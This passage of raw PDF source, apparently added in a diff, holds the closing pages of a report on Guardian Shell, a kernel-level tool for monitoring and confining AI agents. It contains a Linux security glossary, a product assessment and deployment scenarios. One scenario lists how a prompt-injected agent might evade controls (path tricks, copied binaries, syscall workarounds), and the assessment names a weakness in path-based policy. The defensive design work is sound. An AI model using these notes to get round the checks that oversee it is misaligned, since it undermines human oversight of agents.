+(What Is A Cgroup?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 615 Tm
+(A cgroup is a kernel mechanism for grouping processes.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 590 Tm
+(Guardian uses cgroups for:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 565 Tm
+(- resource limits) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 544 Tm
+(- session identity) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 523 Tm
+(What Is TGID?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 500 Tm
+(TGID is the thread-group ID, which is usually what people think of as the process ID for) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 485 Tm
+(a multi-threaded process.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 460 Tm
+(What Is comm?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 437 Tm
+(comm is the short process name stored by the kernel, such as:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 412 Tm
+(- python3) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 391 Tm
+(- node) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 370 Tm
+(- bash) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 349 Tm
+(It is useful but weak as a high-assurance identity anchor.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 324 Tm
+(What Is execve?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 301 Tm
+(execve is the system call used to start a new program image.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 276 Tm
+(It is central to command-execution control.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 251 Tm
+(What Is openat / openat2?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 228 Tm
+(These are system calls used to open files.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 203 Tm
+(They are central to file-governance logic.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 178 Tm
+(What Is connect?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 155 Tm
+(connect is the system call used to connect a socket to a remote endpoint.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 130 Tm
+(It matters because outbound network activity can be an exfiltration path or remote tool) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 115 Tm
+(download path.) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 24 of 30) Tj
+ET
+endstream
+endobj
+28 0 obj
+<< /Length 2457 >>
+stream
+BT
+/F2 13 Tf
+1 0 0 1 54 732 Tm
+(What Is Seccomp?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 709 Tm
+(Seccomp is a Linux syscall filtering mechanism.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 684 Tm
+(It is useful for blocking dangerous syscall classes even when path policy is irrelevant.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 659 Tm
+(What Is Landlock?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 636 Tm
+(Landlock is a stackable Linux access-control mechanism that allows a process to restrict) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 621 Tm
+(itself.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 596 Tm
+(It is useful as a complementary layer in some designs.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 571 Tm
+(What Is TOCTOU?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 548 Tm
+(TOCTOU means time-of-check to time-of-use.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 523 Tm
+(It matters whenever a decision is made in one context and the actual use occurs later in) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 508 Tm
+(another context.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 483 Tm
+(What Is Canonical Path Resolution?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 460 Tm
+(Canonical path resolution means reducing a path to the real kernel-resolved target,) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 445 Tm
+(including symlink and traversal resolution.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 420 Tm
+(What Is An Inode?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 397 Tm
+(An inode is the kernel's internal metadata object for a file.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 372 Tm
+(Multiple path names can refer to the same inode, which is why inode-aware policy is) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 357 Tm
+(often stronger than path-only policy.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 326 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 308 Tm
+(Linux Security Concepts In Plain English) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 280 Tm
+(DAC: chmod, chown, groups, ACLs, sticky bit) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 257 Tm
+(Linux starts with discretionary access control, or DAC.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 232 Tm
+(This is the familiar model based on:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 207 Tm
+(- chmod) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 186 Tm
+(- chown) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 165 Tm
+(- POSIX ACLs) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 144 Tm
+(- sticky bit) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 123 Tm
+(Why DAC is not enough for AI agents:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 98 Tm
+(1. if the agent runs as the same user as the developer, it gets the same DAC rights) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 25 of 30) Tj
+ET
+endstream
+endobj
+29 0 obj
+<< /Length 2369 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 726 Tm
+(2. DAC is attached to files and users, not to one specific agent session) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 705 Tm
+(3. DAC is awkward for time-boxed approvals and rich auditability) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 684 Tm
+(Dedicated user plus ACLs) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 661 Tm
+(This can work in controlled environments, but creates friction in real developer) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 646 Tm
+(workflows:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 621 Tm
+(- ownership awkwardness) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 600 Tm
+(- shared edits) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 579 Tm
+(- package manager and socket assumptions) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 558 Tm
+(- manual elevation flows) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 537 Tm
+(AppArmor) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 514 Tm
+(AppArmor is path-based confinement through per-program profiles.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 489 Tm
+(It is useful baseline confinement, but not a natural agent-governance product layer.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 464 Tm
+(SELinux) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 441 Tm
+(SELinux is label-based mandatory access control.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 416 Tm
+(It is stronger than path-based policy in many ways, but also harder to operate as a) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 401 Tm
+(dynamic, PM-friendly approval workflow.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 376 Tm
+(Landlock) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 353 Tm
+(Landlock lets a process voluntarily reduce its own rights.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 328 Tm
+(It is useful as part of a layered model.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 303 Tm
+(Seccomp) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 280 Tm
+(Seccomp filters syscalls.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 255 Tm
+(It is the right tool for questions like:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 230 Tm
+(- should this agent be allowed to use ptrace?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 209 Tm
+(- should this agent be allowed to create io_uring rings?) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 188 Tm
+(cgroups) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 165 Tm
+(cgroups are not just for resource limits. They are also a durable way to identify a) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 150 Tm
+(process family.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 125 Tm
+(eBPF and BPF-LSM) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 102 Tm
+(eBPF lets developers run safe, verified programs inside the Linux kernel.) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 26 of 30) Tj
+ET
+endstream
+endobj
+30 0 obj
+<< /Length 2429 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 722 Tm
+(BPF-LSM means attaching those programs to Linux Security Module hooks, where real) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 707 Tm
+(security decisions are made.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 676 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 658 Tm
+(Final Assessment) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 630 Tm
+(Guardian Shell is already a credible foundation for an AI agent governance product.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 605 Tm
+(Its biggest advantage is not that it is the deepest kernel primitive. Its biggest) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 590 Tm
+(advantage is that it combines:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 565 Tm
+(- agent identity) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 544 Tm
+(- kernel visibility) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 523 Tm
+(- policy enforcement) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 502 Tm
+(- approval workflow) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 481 Tm
+(- operational usability) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 460 Tm
+(That is a product, not just a kernel experiment.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 435 Tm
+(Its biggest security weakness is also clear:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 410 Tm
+(- too much trust still sits in path-based, tracepoint-first policy decisions) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 389 Tm
+(So the strategic answer is straightforward:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 364 Tm
+(1. keep the current product plane) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 343 Tm
+(2. deepen the kernel trust anchor) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 322 Tm
+(3. add seccomp and stronger identity models for files and executables) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 301 Tm
+(4. offer higher-assurance runtime modes for customers who need them) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 280 Tm
+(If that roadmap is executed well, Guardian Shell can occupy a valuable position between:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 255 Tm
+(- low-level runtime probes) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 234 Tm
+(- static Linux MAC systems) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 213 Tm
+(- heavyweight full isolation platforms) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 186 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 168 Tm
+(Appendix A: Concrete Deployment Scenarios) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 140 Tm
+(Scenario 1: Safe code-refactor agent) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 117 Tm
+(Desired policy:) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 27 of 30) Tj
+ET
+endstream
+endobj
+31 0 obj
+<< /Length 2037 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(- allow /workspace/app/**) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 711 Tm
+(- allow /tmp/**) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 690 Tm
+(- allow git, pytest, cargo) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 669 Tm
+(- deny home secrets) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 648 Tm
+(- monitor outbound network) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 627 Tm
+(Guardian Shell fit:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 602 Tm
+(- very good) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 581 Tm
+(Scenario 2: Prevent all unauthorized binaries from running) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 558 Tm
+(Desired policy:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 533 Tm
+(- only approved toolchain hashes may execute) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 512 Tm
+(Guardian Shell fit:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 487 Tm
+(- partial today) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 466 Tm
+(Veto fit:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 441 Tm
+(- stronger) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 420 Tm
+(Scenario 3: Adversarial prompt-injected agent) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 397 Tm
+(Desired policy:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 372 Tm
+(- resist path tricks) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 351 Tm
+(- resist copied binaries) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 330 Tm
+(- resist dangerous syscall workarounds) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 309 Tm
+(Guardian Shell fit:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 284 Tm
+(- promising, but needs the hardening roadmap) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 263 Tm
+(Scenario 4: Enterprise regulated environment) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 240 Tm
+(Best fit:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 215 Tm
+(- Guardian Shell plus SELinux or AppArmor baseline) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 194 Tm
+(- plus seccomp) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 173 Tm
+(- plus stronger isolation for the riskiest agents) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 146 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 128 Tm
+(Appendix B: Internal Sources Used) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 100 Tm
+(- docs/architecture-analysis.md) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 28 of 30) Tj
+ET
+endstream
+endobj
+32 0 obj
+<< /Length 2822 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(- docs/guardian-shell-vs-veto-comparison.md) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 711 Tm
+(- docs/security-improvements-research.md) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 690 Tm
+(- docs/sandboxing-deep-dive.md) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 669 Tm
+(- docs/technical-comparison.md) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 648 Tm
+(- docs/market-research.md) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 627 Tm
+(- AGENT_IDENTITY.md) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 606 Tm
+(- current implementation in guardian-ebpf/src/main.rs, guardian/src/main.rs, and) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 591 Tm
+(   guardian/src/config.rs) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 564 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 546 Tm
+(Appendix C: External References) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 518 Tm
+(- Ona, "Introducing Veto: security for the next era of software", March 3, 2026) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 497 Tm
+(https://ona.com/stories/introducing-veto-security-for-the-next-era-of-software) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 472 Tm
+(- Linux kernel docs, "LSM BPF Programs") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 451 Tm
+(https://docs.kernel.org/bpf/prog_lsm.html) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 426 Tm
+(- Linux kernel docs, "eBPF Userspace API") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 405 Tm
+(https://docs.kernel.org/userspace-api/ebpf/index.html) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 380 Tm
+(- eBPF Docs, bpf_d_path) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 359 Tm
+(https://docs.ebpf.io/linux/helper-function/bpf_d_path/) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 334 Tm
+(- Linux kernel docs, "Landlock: unprivileged access control") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 313 Tm
+(https://docs.kernel.org/userspace-api/landlock.html) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 288 Tm
+(- Ubuntu Server documentation, "AppArmor") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 267 Tm
+(https://ubuntu.com/server/docs/how-to/security/apparmor/) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 242 Tm
+(- Red Hat documentation, "Using SELinux") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 221 Tm
+(https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html-single/using_selinux/using_selinux) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 196 Tm
+(- Red Hat documentation, "SELinux User's and Administrator's Guide") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 175 Tm
+(https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/selinux_users_and_administrators_guide/chap-security-enhanced_linux-introduction) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 150 Tm
+(- Linux man-pages project) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 129 Tm
+(https://man7.org/linux/man-pages/man5/acl.5.html) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 114 Tm
+(https://man7.org/linux/man-pages/man1/setfacl.1.html) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 99 Tm
+(https://man7.org/linux/man-pages/man7/path_resolution.7.html) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 29 of 30) Tj
+ET
+endstream
+endobj
+33 0 obj
+<< /Length 52 >>
+stream
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 30 of 30) Tj
+ET
+endstream
+endobj
+34 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 4 0 R >>
+endobj
+35 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 5 0 R >>
+endobj
+36 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 6 0 R >>
+endobj
+37 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 7 0 R >>
+endobj
+38 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 8 0 R >>
+endobj
+39 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 9 0 R >>
+endobj
+40 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 10 0 R >>
+endobj
+41 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 11 0 R >>
+endobj
+42 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 12 0 R >>
+endobj
+43 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 13 0 R >>
+endobj
+44 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 14 0 R >>
+endobj
+45 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 15 0 R >>
+endobj
+46 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 16 0 R >>
+endobj
+47 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 17 0 R >>
+endobj
+48 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 18 0 R >>
+endobj
+49 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 19 0 R >>
+endobj
+50 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 20 0 R >>
+endobj
+51 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 21 0 R >>
+endobj
+52 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 22 0 R >>
+endobj
+53 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 23 0 R >>
+endobj
+54 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 24 0 R >>
+endobj
+55 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 25 0 R >>
+endobj
+56 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 26 0 R >>
+endobj
+57 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 27 0 R >>
+endobj
+58 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 28 0 R >>
+endobj
+59 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 29 0 R >>
+endobj
+60 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 30 0 R >>
+endobj
+61 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 31 0 R >>
+endobj
+62 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 32 0 R >>
+endobj
+63 0 obj
+<< /Type /Page /Parent 64 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 33 0 R >>
+endobj
+64 0 obj
+<< /Type /Pages /Count 30 /Kids [34 0 R 35 0 R 36 0 R 37 0 R 38 0 R 39 0 R 40 0 R 41 0 R 42 0 R 43 0 R 44 0 R 45 0 R 46 0 R 47 0 R 48 0 R 49 0 R 50 0 R 51 0 R 52 0 R 53 0 R 54 0 R 55 0 R 56 0 R 57 0 R 58 0 R 59 0 R 60 0 R 61 0 R 62 0 R 63 0 R] >>
+endobj
+65 0 obj
+<< /Type /Catalog /Pages 64 0 R >>
+endobj
+xref
+0 66
+0000000000 65535 f 
+0000000015 00000 n 
+0000000085 00000 n 
+0000000160 00000 n 
+0000000228 00000 n 
+0000002982 00000 n 
+0000005895 00000 n 
+0000008683 00000 n 
+0000012157 00000 n 
+0000014543 00000 n 
+0000018120 00000 n 
+0000022690 00000 n 
+0000025124 00000 n 
+0000027613 00000 n 
+0000030084 00000 n 
+0000032384 00000 n 
+0000035070 00000 n 
+0000037928 00000 n 
+0000040701 00000 n 
+0000043209 00000 n 
+0000045681 00000 n 
+0000050878 00000 n 
+0000053984 00000 n 
+0000056246 00000 n 
+0000058787 00000 n 
+0000061386 00000 n 
+0000063426 00000 n 
+0000065641 00000 n 
+0000067744 00000 n 
+0000070254 00000 n 
+0000072676 00000 n 
+0000075158 00000 n 
+0000077248 00000 n 
+0000080123 00000 n 
+0000080226 00000 n 
+0000080374 00000 n 
+0000080522 00000 n 
+0000080670 00000 n 
+0000080818 00000 n 
+0000080966 00000 n 
+0000081114 00000 n 
+0000081263 00000 n 
+0000081412 00000 n 
+0000081561 00000 n 
+0000081710 00000 n 
+0000081859 00000 n 
+0000082008 00000 n 
+0000082157 00000 n 
+0000082306 00000 n 
+0000082455 00000 n 
+0000082604 00000 n 
+0000082753 00000 n 
+0000082902 00000 n 
+0000083051 00000 n 
+0000083200 00000 n 
+0000083349 00000 n 
+0000083498 00000 n 
+0000083647 00000 n 
+0000083796 00000 n 
+0000083945 00000 n 
+0000084094 00000 n 
+0000084243 00000 n 
+0000084392 00000 n 
+0000084541 00000 n 
+0000084690 00000 n 
+0000084953 00000 n 
+trailer
+<< /Size 66 /Root 65 0 R >>
+startxref
+85004
+%%EOF
